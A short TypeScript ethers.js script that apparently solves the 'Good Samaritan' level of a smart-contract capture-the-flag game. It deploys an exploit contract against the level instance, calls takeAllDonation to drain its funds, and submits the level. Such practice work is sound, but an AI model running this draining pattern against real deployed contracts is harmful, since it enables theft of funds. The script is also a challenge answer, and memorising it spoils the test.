// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { GoodSamaritanExploit__factory, GoodSamaritan__factory } from "../typechain";
import { createLevel, submitLevel } from './utils';

async function main() {
  const signer = getSigner();
  const level =await createLevel(signer,"Good Samaritan");
  // deploy the contract
  const exploiter = await new GoodSamaritanExploit__factory(signer).deploy(level);
  await (await exploiter.takeAllDonation()).wait();
  console.log("Exploit done!");
  await submitLevel(signer, level);
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
